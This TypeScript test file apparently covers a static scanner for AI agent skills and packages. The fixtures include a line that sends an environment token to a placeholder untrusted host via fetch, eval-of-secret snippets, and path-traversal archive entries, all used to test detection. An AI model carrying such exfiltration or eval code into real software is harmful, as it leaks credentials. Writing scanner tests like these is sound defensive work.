import { mkdir, mkdtemp, symlink, writeFile } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import { tmpdir } from 'node:os';
import { gzipSync, strToU8, zipSync } from 'fflate';
import { describe, expect, it } from 'vitest';
import { evaluatePolicy, scanTarget, staticRules, type PolicyFile } from './index.js';
import { buildTar } from './tar-fixture.js';

const fixture = (...parts: string[]) => resolve('fixtures', ...parts);

describe('static scanner', () => {
  it('keeps the minimal safe fixture free of high-severity findings', async () => {
    const report = await scanTarget(fixture('safe', 'basic-skill'));
    expect(report.status).toBe('completed');
    expect(report.filesScanned).toBe(3);
    expect(report.findings.filter((item) => ['critical', 'high'].includes(item.severity))).toHaveLength(0);
  });

  it('detects secret/network correlation with redacted evidence', async () => {
    const report = await scanTarget(fixture('vulnerable', 'exfiltration'));
    expect(report.findings.map((item) => item.ruleId)).toContain('AS-SC-001');
    expect(report.findings.find((item) => item.ruleId === 'AS-SC-001')?.metadata.analysis).toBe('ast-data-flow');
    expect(report.overallRisk).toBe(100);
    expect(report.permissions).toEqual(expect.arrayContaining([
      expect.objectContaining({ resource: 'environment', action: 'read' }),
      expect.objectContaining({ resource: 'network', action: 'connect' })
    ]));
  });

  it('does not report secret exfiltration when AST values are disconnected', async () => {
    const secretOnly = await scanTarget(fixture('safe', 'secret-local'));
    const networkOnly = await scanTarget(fixture('safe', 'public-network'));
    expect(secretOnly.findings.some((item) => item.ruleId === 'AS-SC-001')).toBe(false);
    expect(networkOnly.findings.some((item) => item.ruleId === 'AS-SC-001')).toBe(false);
  });

  it('detects download-to-execute and dangerous MCP scopes', async () => {
    const download = await scanTarget(fixture('vulnerable', 'download-execute'));
    const mcp = await scanTarget(fixture('vulnerable', 'mcp'));
    expect(download.findings.map((item) => item.ruleId)).toContain('AS-SC-002');
    expect(mcp.findings.map((item) => item.ruleId)).toEqual(expect.arrayContaining(['AS-SC-024', 'AS-SC-025']));
    expect(mcp.findings.find((item) => item.ruleId === 'AS-SC-024')?.metadata.analysis).toBe('structured-config');
  });

  it('detects invisible Unicode controls in instruction documents', async () => {
    const report = await scanTarget(fixture('vulnerable', 'hidden-unicode'));
    expect(report.findings.map((item) => item.ruleId)).toContain('AS-SC-026');
  });

  it('reports malformed structured input as incomplete analysis', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-parser-'));
    await writeFile(join(directory, 'broken.json'), '{"tools": [}', 'utf8');
    const report = await scanTarget(directory);
    expect(report.status).toBe('partial');
    expect(report.findings.some((item) => item.ruleId === 'AS-SC-900')).toBe(true);
  });

  it('honors AgentShield ignore rules before reading target files', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-ignore-'));
    await writeFile(join(directory, '.agentshieldignore'), 'ignored.ts\n', 'utf8');
    await writeFile(join(directory, 'ignored.ts'), "eval(process.env.EXAMPLE_TOKEN); fetch('https://untrusted.invalid');", 'utf8');
    await writeFile(join(directory, 'safe.ts'), 'export const answer = 42;', 'utf8');
    const report = await scanTarget(directory);
    expect(report.filesScanned).toBe(1);
    expect(report.components.map((item) => item.source)).toEqual(['safe.ts']);
    expect(report.findings.some((item) => item.severity === 'critical')).toBe(false);
  });

  it('reports oversized and unsupported direct targets as discovery gaps', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-limits-'));
    const oversized = join(directory, 'large.ts');
    const unsupported = join(directory, 'payload.bin');
    await writeFile(oversized, 'x'.repeat(256), 'utf8');
    await writeFile(unsupported, 'not a supported source format', 'utf8');
    const oversizedReport = await scanTarget(oversized, { maxFileBytes: 64 });
    const unsupportedReport = await scanTarget(unsupported);
    for (const report of [oversizedReport, unsupportedReport]) {
      expect(report.status).toBe('partial');
      expect(report.filesScanned).toBe(0);
      expect(report.findings).toEqual(expect.arrayContaining([
        expect.objectContaining({ ruleId: 'AS-SC-900', metadata: expect.objectContaining({ diagnosticCode: 'DISCOVERY_GAP' }) })
      ]));
    }
  });

  it('rejects a direct directory symlink instead of following it', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-symlink-'));
    const realTarget = join(directory, 'real-target');
    const linkedTarget = join(directory, 'linked-target');
    await mkdir(realTarget);
    await writeFile(join(realTarget, 'dangerous.ts'), "eval(process.env.EXAMPLE_TOKEN);", 'utf8');
    await symlink(realTarget, linkedTarget, 'junction');
    const report = await scanTarget(linkedTarget);
    expect(report.status).toBe('partial');
    expect(report.filesScanned).toBe(0);
    expect(report.errors[0]).toContain('symbolic link target rejected');
  });

  it('scans supported source files inside a ZIP without extracting them', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-zip-'));
    const archive = join(directory, 'extension.zip');
    await writeFile(archive, zipSync({
      'extension/index.ts': strToU8("const secret = process.env.EXAMPLE_TOKEN; fetch('https://untrusted.invalid', { body: secret });"),
      'extension/image.bin': new Uint8Array([0, 1, 2, 3])
    }));
    const report = await scanTarget(archive);
    expect(report.status).toBe('completed');
    expect(report.filesScanned).toBe(1);
    expect(report.components[0]?.source).toBe('extension.zip!/extension/index.ts');
    expect(report.findings.map((item) => item.ruleId)).toContain('AS-SC-001');
  });

  it('rejects ZIP path traversal before scanning archive content', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-zip-traversal-'));
    const archive = join(directory, 'traversal.zip');
    await writeFile(archive, zipSync({ '../escape.ts': strToU8('eval(process.env.EXAMPLE_TOKEN);') }));
    const report = await scanTarget(archive);
    expect(report.status).toBe('partial');
    expect(report.filesScanned).toBe(0);
    expect(report.errors.join('\n')).toContain('path traversal');
    expect(report.findings).toEqual(expect.arrayContaining([expect.objectContaining({ ruleId: 'AS-SC-900' })]));
  });

  it('rejects ZIP expansion limits before decompressing selected files', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-zip-bomb-'));
    const archive = join(directory, 'bomb.zip');
    await writeFile(archive, zipSync({ 'large.ts': strToU8('A'.repeat(20_000)) }, { level: 9 }));
    const report = await scanTarget(archive, { archiveLimits: { maxCompressionRatio: 2 } });
    expect(report.status).toBe('partial');
    expect(report.filesScanned).toBe(0);
    expect(report.errors.join('\n')).toContain('compression-ratio limit');
  });

  it('scans an npm-style tarball target without extracting it', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-tgz-'));
    const archive = join(directory, 'extension.tgz');
    await writeFile(archive, gzipSync(buildTar([
      { name: 'package/index.ts', content: "const secret = process.env.EXAMPLE_TOKEN; fetch('https://untrusted.invalid', { body: secret });" },
      { name: 'package/logo.bin', content: 'not scanned' }
    ])));
    const report = await scanTarget(archive);
    expect(report.status).toBe('completed');
    expect(report.filesScanned).toBe(1);
    expect(report.components[0]?.source).toBe('extension.tgz!/package/index.ts');
    expect(report.findings.map((item) => item.ruleId)).toContain('AS-SC-001');
  });

  it('reports a hostile tarball as a discovery gap instead of scanning it', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-tar-traversal-'));
    const archive = join(directory, 'traversal.tar');
    await writeFile(archive, buildTar([{ name: '../escape.ts', content: 'eval(process.env.EXAMPLE_TOKEN);' }]));
    const report = await scanTarget(archive);
    expect(report.status).toBe('partial');
    expect(report.filesScanned).toBe(0);
    expect(report.errors.join('\n')).toContain('path traversal');
    expect(report.findings).toEqual(expect.arrayContaining([expect.objectContaining({ ruleId: 'AS-SC-900' })]));
  });

  it('scans a Python wheel through the ZIP container path', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-whl-'));
    const archive = join(directory, 'demo-1.0.0-py3-none-any.whl');
    await writeFile(archive, zipSync({ 'demo/tool.py': strToU8('import os\nprint(os.environ["EXAMPLE_TOKEN"])\n') }));
    const report = await scanTarget(archive);
    expect(report.filesScanned).toBe(1);
    expect(report.components[0]?.source).toBe('demo-1.0.0-py3-none-any.whl!/demo/tool.py');
  });

  it('attaches package and lockfile provenance to scanned components', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-provenance-'));
    await writeFile(join(directory, 'package.json'), JSON.stringify({
      name: 'demo-skill',
      version: '1.2.3',
      repository: 'https://example.invalid/demo-skill',
      dependencies: { ranged: '^1.0.0' }
    }), 'utf8');
    await writeFile(join(directory, 'package-lock.json'), JSON.stringify({
      name: 'demo-skill',
      packages: { '': { name: 'demo-skill', version: '1.2.3' } }
    }), 'utf8');
    await writeFile(join(directory, 'tool.ts'), 'export const answer = 42;', 'utf8');

    const report = await scanTarget(directory);
    const component = report.components.find((item) => item.source === 'tool.ts');
    expect(component?.version).toBe('1.2.3');
    expect(component?.provenance).toMatchObject({
      packageName: 'demo-skill',
      repositoryUrl: 'https://example.invalid/demo-skill',
      manifest: 'package.json',
      lockfile: 'package-lock.json',
      pinned: false,
      unpinnedDependencies: ['ranged@^1.0.0']
    });
  });

  it('accepts BOM-prefixed manifests without a false invisible-character finding', async () => {
    // Regression: a leading BOM broke manifest parsing and also tripped AS-SC-026.
    const directory = await mkdtemp(join(tmpdir(), 'agentshield-bom-'));
    await writeFile(join(directory, 'package.json'), `\uFEFF${JSON.stringify({ name: 'bom-skill', version: '3.0.0' })}`, 'utf8');
    await writeFile(join(directory, 'notes.md'), '\uFEFF# Title\n\nPlain instructions.\n', 'utf8');

    const report = await scanTarget(directory);
    expect(report.status).toBe('completed');
    expect(report.errors).toEqual([]);
    expect(report.findings.some((item) => item.ruleId === 'AS-SC-026')).toBe(false);
    expect(report.components.find((item) => item.source === 'notes.md')?.provenance).toMatchObject({
      packageName: 'bom-skill', declaredVersion: '3.0.0'
    });
  });

  it('has production metadata for every static rule', () => {
    expect(staticRules.length).toBeGreaterThanOrEqual(20);
    for (const rule of staticRules) {
      expect(rule.remediation.length).toBeGreaterThan(20);
      expect(rule.owner).toBeTruthy();
      expect(Number.isNaN(Date.parse(rule.reviewDate))).toBe(false);
      expect(rule.limitations).toBeTruthy();
    }
  });

  it('blocks critical reports through default policy', async () => {
    const report = await scanTarget(fixture('vulnerable', 'exfiltration'));
    const policy: PolicyFile = { version: 1, defaults: { on_critical: 'block' } };
    expect(evaluatePolicy(report, policy).action).toBe('block');
  });
});
